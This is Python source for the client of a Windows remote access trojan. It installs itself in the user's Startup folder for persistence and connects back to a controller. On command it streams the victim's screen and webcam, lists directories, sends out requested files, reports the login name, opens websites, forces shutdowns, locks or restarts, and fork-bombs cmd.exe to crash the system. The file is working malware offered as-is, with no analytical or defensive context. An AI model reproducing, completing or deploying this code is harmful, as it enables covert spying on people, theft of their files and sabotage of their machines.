import socket
import os
import traceback
import shutil
from vidstream import ScreenShareClient, CameraClient
import threading
import time
import webbrowser
import sys
import pyautogui


# requires port forwarding
#ip = "public ipv4"
ip = "127.0.0.1"
port = 8080
keepgoing = True

try:
    source = os.getcwd() + "\\client.exe"
    username = os.getlogin()
    destination = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\new.exe"
    shutil.copyfile(source, destination)
except:
    print("nope")

def main():
    while (keepgoing == True):
        try:
            sockk = connnnect()
            while keepgoing == True:
                #sockk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                msg = recv(sockk)
                if msg == "exit":
                    exit()
                elif msg == "username":
                    username(sockk)
                elif msg == "screenshare":
                    screenshare(sockk)
                    sockk = connnnect()
                elif msg == "camera":
                    camera(sockk)
                    sockk = connnnect()
                elif msg == "website":
                    website(sockk)
                elif msg == "crash":
                    crash()
                elif msg == "shutdown":
                    shutdown()
                elif msg == "lock":
                    lock()
                elif msg == "restart":
                    restart()
                elif msg == "getcwd":
                    getcwd(sockk)
                elif msg == "files":
                    files(sockk)
                elif msg == "download":
                    download(sockk)
                #elif msg == "screenshot":
                    #screenshot(sockk)

        except Exception as err:
            print(Exception, err)

def connnnect():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    address = (ip,port)
    sock.connect(address)
    return sock



def download(sock):
    ftd = sock.recv(1024)
    ftd = ftd.decode()
    file = open(ftd, 'rb')
    data = file.read()
    sock.send(data)

def recv(sock):
    msg = sock.recv(1024)
    msg = msg.decode()
    return msg


def files(sock):
    dir = sock.recv(1024)
    dir = dir.decode()
    output = os.listdir(dir)
    output = str(output)
    sock.send(output.encode())

def getcwd(sock):
    cwd = os.getcwd()
    sock.send(cwd.encode())


def username(sock):
    username = os.getlogin()
    sock.send(username.encode())


def screenshare(sock):
    sock.close()
    sender = ScreenShareClient(ip, 8080)
    t = threading.Thread(target=sender.start_stream)
    t.start()
    time.sleep(15)
    sender.stop_stream()
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    return sock

def camera(sock):
    sock.close()
    sender = CameraClient(ip, 8080)
    t = threading.Thread(target=sender.start_stream)
    t.start()
    time.sleep(15)
    sender.stop_stream()
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    return sock


def website(sock):
    website = sock.recv(1024)
    website = website.decode()
    webbrowser.open(website, new=1)


def crash():
    while True:
        os.system("start /B start cmd.exe")


def shutdown():
    os.system("shutdown /s /t 1")


def lock():
    os.system("shutdown /l")


def restart():
    os.system("shutdown /r /t 1")

main()
